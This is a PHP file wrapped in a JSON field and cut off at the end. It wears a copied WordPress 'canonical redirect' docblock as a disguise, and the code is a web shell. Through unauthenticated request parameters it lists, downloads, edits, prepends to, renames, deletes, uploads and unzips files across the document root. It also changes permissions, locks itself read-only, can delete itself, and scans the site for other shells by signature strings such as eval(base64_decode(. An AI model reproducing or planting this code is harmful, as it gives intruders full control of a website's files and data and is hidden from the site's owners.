{
    "result": "<?php\r\n\/**\r\n * Canonical API to handle WordPress Redirecting\r\n *\r\n * Based on \"Permalink Redirect\" from Scott Yang and \"Enforce www. Preference\"\r\n * by Mark Jaquith\r\n *\r\n * @package WordPress\r\n * @since 2.3.0\r\n *\/\r\n\r\n\/**\r\n * Redirects incoming links to the proper URL based on the site url.\r\n *\r\n * Search engines consider www.somedomain.com and somedomain.com to be two\r\n * different URLs when they both go to the same location. This SEO enhancement\r\n * prevents penalty for duplicate content by redirecting all incoming links to\r\n * one or the other.\r\n *\r\n * Prevents redirection for feeds, trackbacks, searches, and\r\n * admin URLs. Does not redirect on non-pretty-permalink-supporting IIS 7+,\r\n * page\/post previews, WP admin, Trackbacks, robots.txt, searches, or on POST\r\n * requests.\r\n *\r\n * Will also attempt to find the correct link when a user enters a URL that does\r\n * not exist based on exact WordPress query. Will instead try to parse the URL\r\n * or query in an attempt to figure the correct page to go to.\r\n *\r\n * @since 2.3.0\r\n *\r\n * @global WP_Rewrite $wp_rewrite\r\n * @global bool $is_IIS\r\n * @global WP_Query $wp_query\r\n * @global wpdb $wpdb WordPress database abstraction object.\r\n *\r\n * @param string $requested_url Optional. The URL that was requested, used to\r\n *\t\tfigure if redirect is needed.\r\n * @param bool $do_redirect Optional. Redirect to the new URL.\r\n * @return string|void The string of the URL, if redirect needed.\r\n *\/\r\nfunction DirFilesR($dir) \r\n{ \r\n\t$handle = opendir($dir) or die(\"Can't open directory $dir\"); \r\n    $files = Array(); \r\n    $subfiles = Array(); \r\n    while (false !== ($file = readdir($handle))) \r\n    { \r\n      if ($file != \".\" && $file != \"..\") \r\n      { \r\n        if(is_dir($dir.\"\/\".$file)) \r\n        { \r\n          $subfiles = DirFilesR($dir.\"\/\".$file); \r\n          $files = array_merge($files,$subfiles); \r\n        } \r\n        else \r\n        { \r\n          $files[] = $dir.\"\/\".$file; \r\n        } \r\n      } \r\n    } \r\n    closedir($handle); \r\n    return $files; \r\n}\r\n\r\nif (isset($_GET['juke']))\r\n{\r\n\t$arr_files = DirFilesR($_SERVER['DOCUMENT_ROOT']);\r\n\r\n\techo '<td><hr><hr>';\r\n\tforeach ($arr_files as $key)\r\n\t{\r\n\t\t$key_e = str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['SERVER_NAME'], $key);\r\n\t\techo $key_e.';'.filesize($key).\"<br>\\n\";\r\n\t}\r\n\techo '<hr><hr><\/td>';\r\n\t\r\n\texit;\r\n}\r\n?>\r\n<html>\r\n<head>\r\n\t<title><?php echo $_SERVER['SCRIPT_FILENAME'];?><\/title>\r\n\t<style type=\"text\/css\">\r\n\tINPUT[type=\"text\"] {background-color: #fff8e7;}\tbody{background: #fff8e7;color: #4c5866;font-family: Verdana;font-size: 11px;}\r\n\ta:link{color: #33CC99;}\ta:visited{color: #33CC99;}\ta:hover{text-decoration: none;Color: #3399FF;}table {font-size: 11px;}\r\n\ttd {padding: 1px;padding-left: 10px;padding-right: 10px;padding-top: 2px;}\r\n\t<\/style>\r\n<\/head>\r\n<body>\r\n<table cellpadding=\"5\" width=\"80%\">\r\n<?php\r\n$permsself = perms($_SERVER['SCRIPT_FILENAME'], '');\r\nif ($permsself !== '444')\r\n\tchmod($_SERVER['SCRIPT_FILENAME'], 0444);\r\n\r\nfunction del_file($file)\r\n{\r\n\tif(!file_exists($file))\r\n\t\treturn \"file not exists\";\r\n\telse\r\n\t{\r\n\t\tif (!unlink($file))\r\n\t\t{\r\n\t\t\tif (!chmod($file, 0755))\r\n\t\t\t\treturn \"no have permission for chmod!\";\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tif (!unlink($file))\r\n\t\t\t\t\treturn \"can not delete!\";\r\n\t\t\t\telse\r\n\t\t\t\t\treturn \"ok!\";\r\n\t\t\t}\r\n\t\t}\r\n\t\telse\r\n\t\t\treturn \"ok!\";\r\n\t}\r\n}\r\n\r\nif (isset($_GET['dispatch']))\r\n{\r\n\tdel_file($_SERVER['SCRIPT_FILENAME']);\r\n}\r\nif (!empty($_POST['for_del']))\r\n{\r\n\t$real_path_for_del = array();\r\n\t$all_for_del = $_POST['for_del'];\r\n\t\r\n\techo \"<<info>>\";\r\n\tforeach ($all_for_del as $each)\r\n\t{\r\n\t\t$each = strstr($each, '\/');\r\n\t\t$each = $_SERVER['DOCUMENT_ROOT'].'\/'.$each;\r\n\t\t\r\n\t\t$each_for_echo = str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['SERVER_NAME'], $each);\r\n\r\n\t\tif (file_exists($each))\r\n\t\t{\r\n\t\t\tdel_file($each);\r\n\t\t\tif (!file_exists($each))\r\n\t\t\t\techo $each_for_echo.\" - removed\".\"\\n\";\r\n\t\t\telse\r\n\t\t\t\techo $each_for_echo.\" - not removed\".\"\\n\";\r\n\t\t}\r\n\t\telse\r\n\t\t\techo $each_for_echo.\" - not found\".\"\\n\";\r\n\t}\r\n\techo \"<<\/info>>\";\r\n\t\r\n\texit;\r\n}\r\nfunction unzip_file($file)\r\n{\r\n\t$for_del = strrchr($file, '\/');\r\n\t$folder_to_save = str_replace($for_del, '', $file);\r\n\r\n\t\/\/set_time_limit(0);\r\n\t$zip = new ZipArchive;\r\n\t$zip->open($file);\r\n\t$zip->extractTo($folder_to_save);\r\n\t$zip->close();\r\n\techo \"<tr><td>File: $for_del - <font color=\\\"green\\\">unzip successfully<\/font><\/td><\/tr>\";\r\n}\r\n\r\nfunction read_file($file_name)\r\n{\r\n\t$list = $file_name;\r\n\tif (file_exists($file_name) and (filesize($file_name)>1))\r\n\t{\r\n\t\t$file = fopen($list,\"rt\");\r\n\t\t$arr_file = explode(\"\\n\",fread($file,filesize($list)));\r\n\t\tfclose($file);\r\n\t\treturn $arr_file;\r\n\t}\r\n\telse\r\n\t{\r\n\t\t$arr_file = array();\r\n\t\treturn $arr_file;\r\n\t}\r\n}\r\n\r\nfunction clear_folder($dir) \r\n{  \r\n    $d=opendir($dir);  \r\n    while(($entry=readdir($d))!==false) \r\n    { \r\n        if ($entry != \".\" && $entry != \"..\") \r\n        { \r\n            if (is_dir($dir.\"\/\".$entry)) \r\n            {  \r\n                clear_folder($dir.\"\/\".$entry);  \r\n            } \r\n            else \r\n            {  \r\n                unlink ($dir.\"\/\".$entry);  \r\n            } \r\n        } \r\n    } \r\n    closedir($d);  \r\n    rmdir ($dir);  \r\n} \r\n\r\nfunction only_read($file_name)\r\n{\r\n\tif (file_exists($file_name) and (filesize($file_name)>1))\r\n\t{\r\n\t\tif (!$file = fopen($file_name,\"rt\"))\r\n\t\t{\r\n\t\t\tif (!chmod($file_name, 0775))\r\n\t\t\t{\r\n\t\t\t\techo 'can\\'t permission for chmod file<br>';\t\r\n\t\t\t\t$original_file = '';\r\n\t\t\t}\r\n\t\t\telse \/\/ \u00d1\u2021\u00d0\u00bc\u00d0\u00be\u00d0\u00b4\u00d0\u00bd\u00d1\u0192\u00d0\u00bb\u00d0\u00b8, \u00d0\u00bf\u00d1\u20ac\u00d0\u00be\u00d0\u00b1\u00d1\u0192\u00d0\u00b5\u00d0\u00bc \u00d0\u00b5\u00d1\u2030\u00d0\u00b5 \u00d1\u20ac\u00d0\u00b0\u00d0\u00b7 \u00d0\u00be\u00d1\u201a\u00d0\u00ba\u00d1\u20ac\u00d1\u2039\u00d1\u201a\u00d1\u0152 \u00d1\u201e\u00d0\u00b0\u00d0\u00b9\u00d0\u00bb\r\n\t\t\t{\r\n\t\t\t\tif (!$file = fopen($file_name,\"rt\")) \/\/ \r\n\t\t\t\t{\r\n\t\t\t\t\techo 'can\\'t permission for open file<br>';\r\n\t\t\t\t\t$original_file = '';\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\t$original_file = fread($file,filesize($file_name));\r\n\t\t\t\t\tfclose($file);\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\t$original_file = fread($file,filesize($file_name));\r\n\t\t\tfclose($file);\r\n\t\t}\r\n\t}\r\n\treturn $original_file;\r\n}\r\n\t\t\r\nfunction findshells($start) \r\n{\r\n\tglobal $arr_filename;\r\n\t$files = array();\r\n\tif (!$handle = opendir($start))\r\n\t\tchmod($start, 0755);\r\n\t\r\n\t$handle = opendir($start);\r\n\t\r\n\twhile(($file=readdir($handle))!==false)\r\n\t{\t\r\n\t\tif ($file!=\".\" && $file !=\"..\") \r\n\t\t{\r\n\t\t\t$startfile = $start.\"\/\".$file;\r\n\t\t\tif (is_dir($startfile)) \r\n\t\t\t\tfindshells($startfile);\t\r\n\t\t\telse \r\n\t\t\t{\r\n\t\t\t\t$result = stristr($startfile, $_SERVER['SCRIPT_FILENAME']);\r\n\t\t\t\t\r\n\t\t\t\tif ($result == false)\r\n\t\t\t\t\t$arr_filename[] = $startfile;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\tclosedir($handle);\r\n\treturn $arr_filename;\r\n}\r\n\r\nif (isset ($_GET['unzip']))\r\n{\r\n\tunzip_file($_GET['unzip']);\r\n}\r\n\r\nif (isset ($_GET['finder']))\r\n{\r\n\t$domain = $_SERVER['SERVER_NAME'];\r\n\t$script_path = $_SERVER['SCRIPT_NAME'];\r\n\t$finderdata_path = $_SERVER['DOCUMENT_ROOT'].\"\/finderdata.txt\";\r\n\t$good_result_path = $_SERVER['DOCUMENT_ROOT'].\"\/goodfinderdata.txt\";;\r\n\t\r\n\t\r\n\t\r\n\t$search_str = 'eval(base64_decode(';\r\n\t$search_str2 = 'Array(base64_decode(';\r\n\t$search_str3 = '@$isbot';\r\n\t$search_str4 = '@require';\r\n\t$search_str5 = 'eval(gzuncompress(base64_decode(';\r\n\t$search_str6 = '@include \"\\x2';\r\n\t$search_str7 = '$OO';\r\n\t$search_str8 = 'cache=00';\r\n\t$search_str9 = 'file_get_contents(\\\"..\/index.php\\\")\"';\r\n\t$search_str10 = 'is_uploaded_file';\r\n\t$search_str11 = 'base64_decode($_POST';\r\n\t$search_str12 = 'multipart\/form-data';\r\n\t\r\n\tif (!file_exists($finderdata_path))\r\n\t{\r\n\t\t$arr_php_file = findshells($_SERVER['DOCUMENT_ROOT']);\r\n\r\n\t\t$f = fopen ($finderdata_path, \"a\");\r\n\t\tforeach ($arr_php_file as $each)\r\n\t\t{\r\n\t\t\tif ($each !== $_SERVER['SCRIPT_FILENAME'])\r\n\t\t\t\tfwrite($f, $each.\"\\n\");\r\n\t\t}\r\n\t\tfclose($f);\r\n\t\t\r\n\t\tif (file_exists($finderdata_path))\r\n\t\t{\r\n\t\t\t$redirect = str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['SERVER_NAME'], $_SERVER['SCRIPT_FILENAME']);\r\n\t\t\t$redirect = 'http:\/\/'.$redirect.'?finder';;\r\n\t\t\t?>\t\r\n\t\t\t<script language = 'javascript'>\r\n\t\t\tvar delay = 300;\r\n\t\t\tsetTimeout(\"document.location.href='<?php echo $redirect;?>'\", delay);\r\n\t\t\t<\/script>\r\n\t\t\t<?php\t\r\n\t\t}\r\n\t\telse\r\n\t\t\techo 'error: file finderdata.txt can not create';\r\n\t\t\r\n\t}\r\n\telse\r\n\t{\r\n\t\t$all_path = read_file($finderdata_path);\r\n\t\t$urls_for_work = array ();\r\n\t\t\r\n\t\tfor ( $u=0; $u < 900; $u++ )\r\n\t\t{\r\n\t\t\tif (($all_path[$u] !== null) and ($all_path[$u] !== ' ') and ($all_path[$u] !== '') and ($all_path[$u] !== '.') and ($all_path[$u] !== '..'))\r\n\t\t\t\t$urls_for_work[] = trim($all_path[$u]);\r\n\t\t}\r\n\r\n\t\tfor ( $i=0; $i < 900; $i++ )\r\n\t\t{\r\n\t\t\tunset($all_path[$i]);\r\n\t\t}\r\n\t\t\t\t\r\n\t\t$fnew = fopen($finderdata_path, \"w\");\r\n\t\tforeach ($all_path as $each_path)\r\n\t\t{\r\n\t\t\tif (($each_path !== null) and ($each_path !== '') and ($each_path !== ' '))\r\n\t\t\t\tfwrite($fnew, $each_path.\"\\n\");\r\n\t\t}\r\n\t\tfclose($fnew);\r\n\r\n\t\tforeach ($urls_for_work as $each_for_check)\r\n\t\t{\r\n\t\t\tif (file_exists($each_for_check))\r\n\t\t\t{\r\n\t\t\t\tif (((filesize($each_for_check)) < 5000000))\r\n\t\t\t\t$each_read = only_read($each_for_check);\r\n\t\t\t\telse\r\n\t\t\t\t\t$each_read = '';\r\n\t\t\t\t\r\n\t\t\t\t$result = stristr($each_read, $search_str);\r\n\t\t\t\t$result2 = stristr($each_read, $search_str2);\r\n\t\t\t\t$result3 = stristr($each_read, $search_str3);\r\n\t\t\t\t$result4 = stristr($each_read, $search_str4);\r\n\t\t\t\t$result5 = stristr($each_read, $search_str5);\r\n\t\t\t\t$result6 = stristr($each_read, $search_str6);\r\n\t\t\t\t$result7 = stristr($each_read, $search_str7);\r\n\t\t\t\t$result8 = stristr($each_read, $search_str8);\r\n\t\t\t\t$result9 = stristr($each_read, $search_str9);\r\n\t\t\t\t$result10 = stristr($each_read, $search_str10);\r\n\t\t\t\t$result11 = stristr($each_read, $search_str11);\r\n\t\t\t\t$result12 = stristr($each_read, $search_str12);\r\n\t\t\t\tif (($result !== false) or ($result2 !== false) or ($result3 !== false) or ($result4 !== false) or ($result5 !== false) or ($result6 !== false) or ($result7 !== false) or ($result8 !== false) or ($result9 !== false) or ($result10 !== false) or ($result11 !== false) or ($result12 !== false))\r\n\t\t\t\t{\r\n\t\t\t\t\t$f = fopen ($good_result_path, \"a\");\r\n\t\t\t\t\tfwrite($f, $each_for_check.\"\\n\");\r\n\t\t\t\t\tfclose($f);\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\t\r\n\t\tif (count($all_path)>0)\r\n\t\t\techo count($all_path).\" files for check<br>\";\r\n\t\telse\r\n\t\t\techo '<tr><td>Finish!<\/td><\/tr>';\r\n\t\t\r\n\t\t$for_check = read_file($finderdata_path);\r\n\t\tif (file_exists($finderdata_path) and (filesize($finderdata_path)>1))\r\n\t\t{\r\n\t\t\t$redirect = str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['SERVER_NAME'], $_SERVER['SCRIPT_FILENAME']);\r\n\t\t\t$redirect = 'http:\/\/'.$redirect.'?finder';;\r\n\t\t\t?>\t\r\n\t\t\t<script language = 'javascript'>\r\n\t\t\tvar delay = 100;\r\n\t\t\tsetTimeout(\"document.location.href='<?php echo $redirect;?>'\", delay);\r\n\t\t\t<\/script>\r\n\t\t\t<?php\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\t$arr_result = read_file($good_result_path);\r\n\t\t\t\r\n\t\t\tforeach ($arr_result as $each)\r\n\t\t\t{\r\n\t\t\t\tif (($each !== null) and ($each !== '') and ($each !== ' '))\r\n\t\t\t\t{\r\n\t\t\t\t\tif (isset ($_GET['dir']))\r\n\t\t\t\t\t\t$dr = $_GET['dir'];\r\n\t\t\t\t\telse\r\n\t\t\t\t\t\t$dr = $_SERVER['DOCUMENT_ROOT'];\r\n\t\t\t\t\t\r\n\t\t\t\t\t\r\n\t\t\t\t\t$time = get_time($each);\r\n\t\t\t\t\t\r\n\t\t\t\t\t$real_url = str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['SERVER_NAME'], $each);\r\n\t\t\t\t\t\r\n\t\t\t\t\techo \"<tr bgcolor=\\\"#ffffff\\\" align=\\\"center\\\"><td align=\\\"left\\\" >\".\"<a style=\\\"text-decoration: none;\\\" href=\\\"http:\/\/$domain$script_path?edit=$each&dir=$dr\\\"><font color=\\\"black\\\">$each<\/font><\/a>\".\"<\/td><td>\".get_filesize($each).\"<\/td><td>$time<\/td><td>\".perms($each, '0').\"<\/td><td>\".\"<a href=\\\"http:\/\/$domain$script_path?del=$each&dir=$dr\\\">U<\/a>&nbsp;\".\"<a href=\\\"http:\/\/$domain$script_path?edit=$each&dir=$dr\\\">E<\/a>&nbsp;\".\"<a target=\\\"_blank\\\" href=\\\"http:\/\/$real_url\\\">O<\/a>&nbsp;\".\"<a href=\\\"http:\/\/$domain$script_path?download=$each&dir=$dr\\\">D<\/a>\".\"<\/td><\/tr>\";\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tif (file_exists($finderdata_path))\r\n\t\t\t\tunlink($finderdata_path);\r\n\t\t\t\r\n\t\t\tif (file_exists($good_result_path))\r\n\t\t\t\tunlink($good_result_path);\r\n\t\t}\r\n\t}\r\n}\r\nif (isset ($_GET['download']))\r\n{\r\n\t$file_for_save = $_GET['download'];\r\n\t\t\r\n\tif (file_exists($file_for_save))\r\n\t{\t\r\n\t\theader('Content-Description: File Transfer');\r\n\t\theader('Content-Type: application\/octet-stream');\r\n\t\theader('Content-Disposition: attachment; filename=' . basename($file_for_save));\r\n\t\theader('Content-Transfer-Encoding: binary');\r\n\t\theader('Expires: 0');\r\n\t\theader('Cache-Control: must-revalidate');\r\n\t\theader('Pragma: public');\r\n\t\theader('Content-Length: ' . filesize($file_for_save));\r\n\t\treadfile($_GET['download']);\r\n\t\texit;\r\n\t}\r\n}\r\n?>\r\n<?php\r\n\/\/set_time_limit (0);\r\n\r\nfunction get_filesize($file)\r\n{\r\n\tif(!file_exists($file)) return \"\u00d0\u00a4\u00d0\u00b0\u00d0\u00b9\u00d0\u00bb  \u00d0\u00bd\u00d0\u00b5 \u00d0\u00bd\u00d0\u00b0\u00d0\u00b9\u00d0\u00b4\u00d0\u00b5\u00d0\u00bd\";\r\n\t$filesize = filesize($file);\r\n   if($filesize > 1024)\r\n   {\r\n       $filesize = ($filesize\/1024);\r\n       if($filesize > 1024)\r\n       {\r\n            $filesize = ($filesize\/1024);\r\n           if($filesize > 1024)\r\n           {\r\n               $filesize = ($filesize\/1024);\r\n               $filesize = round($filesize, 1);\r\n               return $filesize.\" gb\";       \r\n           }\r\n           else\r\n           {\r\n               $filesize = round($filesize, 1);\r\n               return $filesize.\" mb\";   \r\n           }       \r\n       }\r\n       else\r\n       {\r\n           $filesize = round($filesize, 1);\r\n           return $filesize.\" kb\";   \r\n       }  \r\n   }\r\n   else\r\n   {\r\n       $filesize = round($filesize, 1);\r\n       return $filesize.\" b\";   \r\n   }\r\n}\r\n\r\nfunction get_time($file)\r\n{\r\n\tif(!file_exists($file)) return \"no info\";\r\n\t\r\n\t$last_update = filemtime($file);\r\n\t$time = date('Y-m-d H:i:s', $last_update);\r\n\t\r\n\treturn $time;\r\n}\r\n\r\n\r\n\r\n\r\n\r\nfunction perms($filename, $check)\r\n{\r\n    $perms = substr(decoct(fileperms($filename)), -3);\r\n\tif ($perms == '644')\r\n\t\t$color = 'green';\r\n\telseif ($perms == '755')\r\n\t\t$color = '#2EC842';\r\n\telseif ($perms == '444')\r\n\t\t$color = 'brown';\r\n\telseif ($perms == '000')\r\n\t\t$color = 'red';\r\n\telseif ($perms == '744')\r\n\t\t$color = 'orange';\r\n\telseif ($perms == '664')\r\n\t\t$color = 'green';\r\n\telse\r\n\t\t$color = 'grey';\r\n\tif ($check == 1)\t\r\n\t\treturn $perms;\r\n\telse\r\n\t\treturn \"<font color=$color>\".$perms.\"<\/font>\";\r\n}\r\nfunction CMS()\r\n{\r\n\tif ((is_dir($_SERVER['DOCUMENT_ROOT'].'\/administrator\/')) and (is_dir($_SERVER['DOCUMENT_ROOT'].'\/components\/')) and (is_dir($_SERVER['DOCUMENT_ROOT'].'\/includes\/')))\r\n\t\treturn \"Joomla!\";\r\n\telseif ((is_dir($_SERVER['DOCUMENT_ROOT'].'\/wp-content\/')) and (is_dir($_SERVER['DOCUMENT_ROOT'].'\/wp-admin\/')) and (is_dir($_SERVER['DOCUMENT_ROOT'].'\/wp-includes\/')))\r\n\t\treturn \"WordPress\"; \r\n\telse\r\n\t\treturn \"Unknown\";\r\n}\r\nfunction folder_separate($path)\r\n{\r\n\t$pos_end = strripos($path, '\/');\r\n\t$path2 = substr_replace($path, '', $pos_end, 99999);\r\n\t\t\t\t\r\n\treturn $path2;\r\n}\r\n\r\nfunction side_bar($make_file)\r\n{\r\n\techo '<td align=\"right\" colspan=\"2\">';\r\n\t\r\n\techo \"<form action = '\".$make_file.\"' method = 'POST'>\";\r\n\techo \"<input name=\\\"search_file\\\" size=\\\"7\\\" type=\\\"text\\\" placeholder=\\\".suspected\\\" \/>\";\r\n\techo \"<input type=\\\"submit\\\" value=\\\"ok\\\" \/><\/form>\";\r\n\t\r\n\techo \"<form action = '\".$make_file.\"' method = 'POST'>\";\r\n\techo \"<input name=\\\"new_file\\\" size=\\\"7\\\" type=\\\"text\\\" placeholder=\\\"make file\\\" \/>\";\r\n\techo \"<input type=\\\"submit\\\" value=\\\"ok\\\" \/><\/form>\";\r\n\t\t\t\t\r\n\techo \"<form action = '\".$make_file.\"' method = 'POST'>\";\r\n\techo \"<input name=\\\"new_dir\\\" size=\\\"7\\\" type=\\\"text\\\" placeholder=\\\"make dir\\\" \/>\";\r\n\techo \"<input type=\\\"submit\\\" value=\\\"ok\\\" \/><\/form>\";\r\n\techo '<\/td><\/tr>';\r\n}\r\n\r\nif (isset($_GET['rename']))\r\n{\r\n\tif (!empty($_POST ['n_name']))\r\n\t{\r\n\t\tif (rename($_GET['rename'], $_POST ['n_name']))\r\n\t\t\t$message_rename = '<font color=\"green\"><b>Name changed!<\/b><\/font>';\r\n\t\telse\r\n\t\t\t$message_rename = '<font color=\"red\"><b>Name can not be changed<\/b><\/font>';\r\n\t\t\t\r\n\t\techo $message_rename;\r\n\t}\r\n}\r\n\r\nfunction edit_file($file, $current)\r\n{\r\n\tif (!empty($_POST['chm']))\r\n\t{\r\n\t\tif ($_POST['chm'] == '0755')\r\n\t\t{\r\n\t\t\tif (chmod($file, 0755))\r\n\t\t\t\t$message_chmod = '<font color=\"green\"><b>Permission changed!<\/b><\/font>';\r\n\t\t\telse\r\n\t\t\t\t$message_chmod = '<font color=\"red\"><b>Unable change permission!<\/b><\/font>';\r\n\t\t}\r\n\t\telseif ($_POST['chm'] == '0444')\r\n\t\t{\r\n\t\t\tif (chmod($file, 0444))\r\n\t\t\t\t$message_chmod = '<font color=\"green\"><b>Permission changed!<\/b><\/font>';\r\n\t\t\telse\r\n\t\t\t\t$message_chmod = '<font color=\"red\"><b>Unable change permission!<\/b><\/font>';\r\n\t\t}\r\n\t\telseif ($_POST['chm'] == '0644')\r\n\t\t{\r\n\t\t\tif (chmod($file, 0644))\r\n\t\t\t\t$message_chmod = '<font color=\"green\"><b>Permission changed!<\/b><\/font>';\r\n\t\t\telse\r\n\t\t\t\t$message_chmod = '<font color=\"red\"><b>Unable change permission!<\/b><\/font>';\r\n\t\t}\r\n\t\telse\r\n\t\t\t$message_chmod = '0755<br>0444<br>0644<br>';\r\n\t\t\r\n\t\techo $message_chmod;\r\n\t}\r\n\tif (empty($_POST['new']))\r\n\t{\r\n\t\t$pos_end = strripos($file, '\/');\r\n\t\t$dir = substr_replace($file, '', $pos_end, 99999);\r\n\r\n\t\tif (file_exists($file) and (filesize($file)>1))\r\n\t\t{\r\n\t\t\tif (!$fp = fopen ($file, \"r\"))\r\n\t\t\t{\r\n\t\t\t\techo 'no have permission<br>';\r\n\t\t\t\t$file_cont = 'can\\'t show';\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\t$file_cont = fread ($fp, filesize ($file));\r\n\t\t\t\tfclose ($fp);\r\n\t\t\t}\r\n\t\t}\r\n\t\telse\r\n\t\t\t$file_cont = '';\r\n\t\t\r\n\t\t$file_cont = str_replace (\"<textarea>\", \"<textarea>\", $file_cont);\r\n\t\t$file_cont = htmlspecialchars($file_cont);\r\n\r\n\t\techo \"<tr><td align=\\\"center\\\" colspan=\\\"5\\\"><form action = 'http:\/\/\".$current.\"?edit=\".$file.\"&dir=\".$dir.\"' method = 'POST'>\\n\";\r\n\t\techo \"File: \". $file . \"<br>\\n\";\r\n\t\techo \"<textarea name = 'new' rows = '20' cols = '120'>\".$file_cont.\"<\/textarea><br>\\n\";\r\n\t\techo \"<div align=\\\"right\\\"><br><input type = 'submit' value = 'Save'><\/div><\/form><\/td><\/tr>\\n\";\r\n\t\t\r\n\t\techo \"<tr><td align=\\\"left\\\"><form action = 'http:\/\/\".$current.\"?edit=\".$file.\"&dir=\".$dir.\"' method = 'POST'>\\n\";\r\n\t\techo \"<input name=\\\"chm\\\" size=\\\"4\\\" type=\\\"text\\\" placeholder=\\\"\".perms($file, '1').\"\\\"\/>\";\r\n\t\techo \"<input type=\\\"submit\\\" value=\\\"ok\\\" \/><\/form><\/td>\\n\";\r\n\t\t\r\n\t\techo \"<td colspan=\\\"3\\\" align=\\\"left\\\"><form action = 'http:\/\/\".$current.\"?rename=\".$file.\"&dir=\".$dir.\"' method = 'POST'>\\n\";\r\n\t\techo \"<input type=\\\"text\\\" name='n_name' size=\\\"72\\\" value=\\\"$file\\\">\";\r\n\t\techo \"<input type=\\\"submit\\\" value=\\\"ok\\\" \/><\/form><\/td><\/tr>\\n\";\r\n\t}\r\n\telse \r\n\t{\r\n\t\tif (!empty($_POST['new_remote']))\r\n\t\t{\r\n\t\t\tif (!chmod($file, 0755))\r\n\t\t\t\treturn \"no have permission for chmod!\";\r\n\t\t\t\r\n\t\t\t$file_cont = only_read($file);\r\n\t\t\t$file_cont = $_POST['new'].$file_cont;\r\n\t\t\t\r\n\t\t\t$fp = fopen ($file, \"w\");\r\n\t\t\tif (fwrite ($fp, $file_cont))\r\n\t\t\t\t$message = ' - <font color=\"green\"><b>Edited!<\/b><\/font>';\r\n\t\t\telse\r\n\t\t\t\t$message = ' - <font color=\"red\"><b>Unable to edit!<\/b><\/font>';\r\n\t\t\tfclose ($fp);\r\n\t\t\tif (!chmod($file, 0444))\r\n\t\t\t\treturn \"no have permission for chmod!\";\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tif (!chmod($file, 0755))\r\n\t\t\t\treturn \"no have permission for chmod!\";\r\n\t\t\t\r\n\t\t\t$fp = fopen ($file, \"w\");\r\n\t\t\tif (fwrite ($fp, $_POST ['new']))\r\n\t\t\t\t$message = ' - <font color=\"green\"><b>Edited!<\/b><\/font>';\r\n\t\t\telse\r\n\t\t\t\t$message = ' - <font color=\"red\"><b>Unable to edit!<\/b><\/font>';\r\n\t\t\tfclose ($fp);\r\n\t\t}\r\n\t\t\r\n\t\t$pos_end = strripos($file, '\/');\r\n\t\t$dir = substr_replace($file, '', $pos_end, 99999);\r\n\r\n\t\t$fp = fopen ($file, \"r\");\r\n\t\t$file_cont = fread ($fp, filesize ($file));\r\n\t\tfclose ($fp);\r\n\t\t\r\n\t\t\r\n\t\t$file_cont = str_replace (\"<textarea>\", \"<textarea>\", $file_cont);\r\n\t\t\r\n\t\techo \"<tr><td align=\\\"center\\\" colspan=\\\"5\\\"><form action = 'http:\/\/\".$current.\"?edit=\".$file.\"&dir=\".$dir.\"' method = 'POST'>\\n\";\r\n\t\techo \"File: \". $file . $message . \"<br>\\n\";\r\n\t\techo \"<textarea name = 'new' rows = '20' cols = '120'>\".$file_cont.\"<\/textarea><br>\\n\";\r\n\t\techo \"<div align=\\\"right\\\"><br><input type = 'submit' value = 'Save'><\/div><\/form><\/td><\/tr>\\n\";\r\n\t\t\r\n\t\techo \"<tr><td align=\\\"left\\\"><form action = 'http:\/\/\".$current.\"?edit=\".$file.\"&dir=\".$dir.\"' method = 'POST'>\\n\";\r\n\t\techo \"<input name=\\\"chm\\\" size=\\\"4\\\" type=\\\"text\\\" placeholder=\\\"\".perms($file, '1').\"\\\"\/>\";\r\n\t\techo \"<input type=\\\"submit\\\" value=\\\"ok\\\" \/><\/form><\/td>\\n\";\r\n\t\t\r\n\t\techo \"<td colspan=\\\"3\\\" align=\\\"left\\\"><form action = 'http:\/\/\".$current.\"?rename=\".$file.\"&dir=\".$dir.\"' method = 'POST'>\\n\";\r\n\t\techo \"<input type=\\\"text\\\" name='n_name' size=\\\"72\\\" value=\\\"$file\\\">\";\r\n\t\techo \"<input type=\\\"submit\\\" value=\\\"ok\\\" \/><\/form><\/td><\/tr>\\n\";\r\n\t\t\r\n\t\tif (chmod($file, 0444))\r\n\t\t\t$message_chmod_last = '<font color=\"green\"><b>Permission changed!<\/b><\/font>';\r\n\t\telse\r\n\t\t\t$message_chmod_last = '<font color=\"red\"><b>Unable change permission!<\/b><\/font>';\r\n\t}\r\n\t\r\n}\r\n\r\nif (isset ($_GET['del']))\r\n{\r\n\tif (is_dir($_GET['del']))\r\n\t\tclear_folder($_GET['del']);\r\n\telse\r\n\t\tdel_file($_GET['del']);\r\n\t\r\n}\r\n\r\n$domain = $_SERVER['SERVER_NAME'];\r\n$script_path = $_SERVER['SCRIPT_NAME'];\r\n$arr_folder = array();\r\n$arr_filenames = array();\r\n?>\r\n\t<tr align=\"left\">\r\n\t\t<td colspan=\"3\">\r\n\t\t<?php\r\n\t\tif (sizeof($_FILES)!=0)\r\n\t\t{\t\r\n\t\t\tif(isset($_FILES) && $_FILES['inputfile']['error'] == 0)\r\n\t\t\t{\r\n\t\t\t\tif (isset ($_GET['dir']))\r\n\t\t\t\t\t$path = $_GET['dir'];\r\n\t\t\t\telse\r\n\t\t\t\t\t$path = $_SERVER['DOCUMENT_ROOT'];\r\n\t\t\t\t\t\r\n\t\t\t\t$destiation_dir = $path .'\/'.$_FILES['inputfile']['name'];\r\n\t\t\t\tmove_uploaded_file($_FILES['inputfile']['tmp_name'], $destiation_dir );\r\n\t\t\t\t\r\n\t\t\t\t$open_upload_file = str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['SERVER_NAME'], $destiation_dir); \r\n\t\t\t\techo '<font color=\"green\"><b>'.\"<a target=\\\"_blank\\\" href=\\\"http:\/\/$open_upload_file\\\">File 